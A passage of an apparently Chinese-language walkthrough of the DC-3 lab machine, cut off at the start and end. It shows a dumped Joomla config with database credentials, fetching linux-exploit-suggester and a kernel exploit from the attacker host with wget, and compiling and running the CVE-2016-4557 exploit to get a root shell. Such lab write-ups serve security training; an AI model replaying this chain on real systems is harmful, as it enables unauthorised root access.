soon.&#x27;</span>;</span><br><span class="line">        public <span class="variable">$display_offline_message</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$offline_image</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sitename</span> = <span class="string">&#x27;DC-3&#x27;</span>;</span><br><span class="line">        public <span class="variable">$editor</span> = <span class="string">&#x27;tinymce&#x27;</span>;</span><br><span class="line">        public <span class="variable">$captcha</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$list_limit</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">        public <span class="variable">$access</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$debug</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$debug_lang</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$dbtype</span> = <span class="string">&#x27;mysqli&#x27;</span>;</span><br><span class="line">        public <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">        public <span class="variable">$user</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">        public <span class="variable">$password</span> = <span class="string">&#x27;squires&#x27;</span>;</span><br><span class="line">        public <span class="variable">$db</span> = <span class="string">&#x27;joomladb&#x27;</span>;</span><br><span class="line">        public <span class="variable">$dbprefix</span> = <span class="string">&#x27;d8uea_&#x27;</span>;</span><br><span class="line">        public <span class="variable">$live_site</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$secret</span> = <span class="string">&#x27;7M6S1HqGMvt1JYkY&#x27;</span>;</span><br><span class="line">        public <span class="variable">$gzip</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$error_reporting</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line">        public <span class="variable">$helpurl</span> = <span class="string">&#x27;https://help.joomla.org/proxy/index.php?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_host</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_port</span> = <span class="string">&#x27;21&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_root</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$ftp_enable</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$offset</span> = <span class="string">&#x27;UTC&#x27;</span>;</span><br><span class="line">        public <span class="variable">$mailonline</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$mailer</span> = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line">        public <span class="variable">$mailfrom</span> = <span class="string">&#x27;freddy@norealaddress.net&#x27;</span>;</span><br><span class="line">        public <span class="variable">$fromname</span> = <span class="string">&#x27;DC-3&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sendmail</span> = <span class="string">&#x27;/usr/sbin/sendmail&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtpauth</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtpuser</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtppass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtphost</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtpsecure</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        public <span class="variable">$smtpport</span> = <span class="string">&#x27;25&#x27;</span>;</span><br><span class="line">        public <span class="variable">$caching</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$cache_handler</span> = <span class="string">&#x27;file&#x27;</span>;</span><br><span class="line">        public <span class="variable">$cachetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">        public <span class="variable">$cache_platformprefix</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaDesc</span> = <span class="string">&#x27;A website for DC-3&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaKeys</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaTitle</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaAuthor</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$MetaVersion</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$robots</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sef</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sef_rewrite</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$sef_suffix</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$unicodeslugs</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        public <span class="variable">$feed_limit</span> = <span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">        public <span class="variable">$feed_email</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        public <span class="variable">$log_path</span> = <span class="string">&#x27;/var/www/html/administrator/logs&#x27;</span>;</span><br><span class="line">        public <span class="variable">$tmp_path</span> = <span class="string">&#x27;/var/www/html/tmp&#x27;</span>;</span><br><span class="line">        public <span class="variable">$lifetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">        public <span class="variable">$session_handler</span> = <span class="string">&#x27;database&#x27;</span>;</span><br><span class="line">        public <span class="variable">$shared_session</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">www-data@DC-3:/var/www/html$</span><br></pre></td></tr></table></figure><p><code>很显然这回没有狗屎运了</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/var/www/html$ sudo -l               </span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data: </span><br></pre></td></tr></table></figure><h3 id="3-利用系统内核提权"><a href="#3-利用系统内核提权" class="headerlink" title="3.利用系统内核提权"></a>3.利用系统内核提权</h3><p><code>查看系统内核提权</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ uname -a      </span><br><span class="line">Linux DC-3 4.4.0-21-generic <span class="comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">www-data@DC-3:/tmp$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 16.04 LTS</span><br><span class="line">Release:        16.04</span><br><span class="line">Codename:       xenial</span><br><span class="line">www-data@DC-3:/tmp$</span><br></pre></td></tr></table></figure><p><code>将linux-exploit-suggester复制到DC3上</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># cp linux-exploit-suggester.sh /root</span></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># cd</span></span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br><span class="line">root@JIYE:~<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.1.5 - - [22/Aug/2020 02:06:47] <span class="string">&quot;GET /linux-exploit-suggester.sh HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ wget 192.168.1.6/linux-exploit-suggester.sh</span><br><span class="line">--2020-08-22 16:07:27--  http://192.168.1.6/linux-exploit-suggester.sh</span><br><span class="line">Connecting to 192.168.1.6:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 84889 (83K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;linux-exploit-suggester.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">linux-exploit-sugge 100%[===================&gt;]  82.90K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-08-22 16:07:27 (353 MB/s) - <span class="string">&#x27;linux-exploit-suggester.sh&#x27;</span> saved [84889/84889]</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp$ ls</span><br><span class="line">linux-exploit-suggester.sh</span><br><span class="line">systemd-private-75689b1bf3f246969cc204a95896c661-systemd-timesyncd.service-bRUc7u</span><br><span class="line">vmware-root</span><br><span class="line">www-data@DC-3:/tmp$ </span><br></pre></td></tr></table></figure><p><code>执行，查找漏洞</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ chmod +x linux-exploit-suggester.sh </span><br><span class="line">www-data@DC-3:/tmp$ ./linux-exploit-suggester.sh </span><br><span class="line"></span><br><span class="line">Available information:</span><br><span class="line"></span><br><span class="line">Kernel version: 4.4.0</span><br><span class="line">Architecture: i686</span><br><span class="line">Distribution: ubuntu</span><br><span class="line">Distribution version: 16.04</span><br><span class="line">Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed</span><br><span class="line">Package listing: from current OS</span><br><span class="line"></span><br><span class="line">Searching among:</span><br><span class="line"></span><br><span class="line">74 kernel space exploits</span><br><span class="line">45 user space exploits</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line"></span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,[ ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125; ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="line">   ext-url: https://www.exploit-db.com/download/40847</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-16995] eBPF_verifier</span><br><span class="line"></span><br><span class="line">   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=9.0&#123;kernel:4.9.0-3-amd64&#125;,fedora=25|26|27,ubuntu=14.04&#123;kernel:4.4.0-89-generic&#125;,[ ubuntu=(16.04|17.04) ]&#123;kernel:4.(8|10).0-(19|28|45)-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/45010</span><br><span class="line">   Comments: CONFIG_BPF_SYSCALL needs to be <span class="built_in">set</span> &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-8655] chocobo_root</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: [ ubuntu=(14.04|16.04)&#123;kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic&#125; ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40871</span><br><span class="line">   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-5195] dirtycow</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40611</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-4557] double-fdput()</span><br><span class="line"></span><br><span class="line">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: [ ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125; ]</span><br><span class="line">   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">   Comments: CONFIG_BPF_SYSCALL needs to be <span class="built_in">set</span> &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-7308] af_packet</span><br><span class="line"></span><br><span class="line">   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=16.04 ]&#123;kernel:4.8.0-(34|36|39|41|42|44|45)-generic&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c</span><br><span class="line">   Comments: CAP_NET_RAW <span class="built_in">cap</span> or CONFIG_USER_NS=y needed. Modified version at <span class="string">&#x27;ext-url&#x27;</span> adds support <span class="keyword">for</span> additional kernels</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-6074] dccp</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=(14.04|16.04) ]&#123;kernel:4.4.0-62-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/41458</span><br><span class="line">   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-1000112] NETIF_F_UFO</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: ubuntu=14.04&#123;kernel:4.4.0-*&#125;,[ ubuntu=16.04 ]&#123;kernel:4.8.0-*&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c</span><br><span class="line">   Comments: CAP_NET_ADMIN <span class="built_in">cap</span> or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at <span class="string">&#x27;ext-url&#x27;</span> adds support <span class="keyword">for</span> additional distros/kernels</span><br><span class="line"></span><br><span class="line">[+] [CVE-2019-18634] sudo pwfeedback</span><br><span class="line"></span><br><span class="line">   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: mint=19</span><br><span class="line">   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c</span><br><span class="line">   Comments: sudo configuration requires pwfeedback to be enabled.</span><br><span class="line"></span><br><span class="line">[+] [CVE-2019-15666] XFRM_UAF</span><br><span class="line"></span><br><span class="line">   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: </span><br><span class="line">   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-9793] SO_&#123;SND|RCV&#125;BUFFORCE</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c</span><br><span class="line">   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested <span class="keyword">in</span> QEMU only</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-2384] usb-midi</span><br><span class="line"></span><br><span class="line">   Details: https://xairy.github.io/blog/2016/cve-2016-2384</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=14.04,fedora=22</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c</span><br><span class="line">   Comments: Requires ability to plug <span class="keyword">in</span> a malicious USB device and to execute a malicious binary as a non-privileged user</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-0728] keyring</span><br><span class="line"></span><br><span class="line">   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of<span class="_">-a</span>-linux-kernel-vulnerability-cve-2016-0728/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40003</span><br><span class="line">   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp$</span><br></pre></td></tr></table></figure><p><code>本次使用</code><strong>[CVE-2016-4557]</strong><code>将39772.zip复制到DC3</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ wget 192.168.1.6/39772.zip</span><br><span class="line">--2020-08-22 16:18:03--  http://192.168.1.6/39772.zip</span><br><span class="line">Connecting to 192.168.1.6:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 7025 (6.9K) [application/zip]</span><br><span class="line">Saving to: <span class="string">&#x27;39772.zip&#x27;</span></span><br><span class="line"></span><br><span class="line">39772.zip           100%[===================&gt;]   6.86K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-08-22 16:18:03 (612 MB/s) - <span class="string">&#x27;39772.zip&#x27;</span> saved [7025/7025]</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp$ ls</span><br><span class="line">39772.zip</span><br><span class="line">linux-exploit-suggester.sh</span><br><span class="line">systemd-private-75689b1bf3f246969cc204a95896c661-systemd-timesyncd.service-bRUc7u</span><br><span class="line">vmware-root</span><br><span class="line">www-data@DC-3:/tmp$ unzip 39772.zip </span><br><span class="line">Archive:  39772.zip</span><br><span class="line">   creating: 39772/</span><br><span class="line">  inflating: 39772/.DS_Store         </span><br><span class="line">   creating: __MACOSX/</span><br><span class="line">   creating: __MACOSX/39772/</span><br><span class="line">  inflating: __MACOSX/39772/._.DS_Store  </span><br><span class="line">  inflating: 39772/crasher.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._crasher.tar  </span><br><span class="line">  inflating: 39772/exploit.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._exploit.tar  </span><br><span class="line">www-data@DC-3:/tmp$ ls</span><br><span class="line">39772</span><br><span class="line">39772.zip</span><br><span class="line">__MACOSX</span><br><span class="line">linux-exploit-suggester.sh</span><br><span class="line">systemd-private-75689b1bf3f246969cc204a95896c661-systemd-timesyncd.service-bRUc7u</span><br><span class="line">vmware-root</span><br><span class="line">www-data@DC-3:/tmp$</span><br></pre></td></tr></table></figure><h3 id="4-exploit"><a href="#4-exploit" class="headerlink" title="4.exploit"></a>4.exploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ <span class="built_in">cd</span> 39772</span><br><span class="line">www-data@DC-3:/tmp/39772$ ls</span><br><span class="line">crasher.tar  exploit.tar</span><br><span class="line">www-data@DC-3:/tmp/39772$ tar -xvf exploit.tar  </span><br><span class="line">ebpf_mapfd_doubleput_exploit/</span><br><span class="line">ebpf_mapfd_doubleput_exploit/hello.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/suidhelper.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/compile.sh</span><br><span class="line">ebpf_mapfd_doubleput_exploit/doubleput.c</span><br><span class="line">www-data@DC-3:/tmp/39772$ ls</span><br><span class="line">crasher.tar  ebpf_mapfd_doubleput_exploit  exploit.tar</span><br><span class="line">www-data@DC-3:/tmp/39772$ <span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit/</span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls</span><br><span class="line">compile.sh  doubleput.c  hello.c  suidhelper.c</span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ chmod +x compile.sh </span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh </span><br><span class="line">doubleput.c: In <span class="keyword">function</span> <span class="string">&#x27;make_setuid&#x27;</span>:</span><br><span class="line">doubleput.c:91:13: warning: cast from pointer to <span class="built_in">integer</span> of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .insns = (__aligned_u64) insns,</span><br><span class="line">             ^</span><br><span class="line">doubleput.c:92:15: warning: cast from pointer to <span class="built_in">integer</span> of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .license = (__aligned_u64)<span class="string">&quot;&quot;</span></span><br><span class="line">               ^</span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$</span><br></pre></td></tr></table></figure><p><code>生成执行文件，进行利用</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls</span><br><span class="line">compile.sh  doubleput  doubleput.c  hello  hello.c  suidhelper  suidhelper.c</span><br><span class="line">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput </span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. <span class="keyword">if</span> this worked, you<span class="string">&#x27;ll have a root shell in &lt;=60 seconds.</span></span><br><span class="line"><span class="string">suid file detected, launching rootshell...</span></span><br><span class="line"><span class="string">we have root privs now...</span></span><br><span class="line"><span class="string">root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit#</span></span><br></pre></td></tr></table></figure><h2 id="0x14-提权完成，找到flag"><a href="#0x14-提权完成，找到flag" class="headerlink" title="0x14.提权完成，找到flag"></a>0x14.提权完成，找到flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 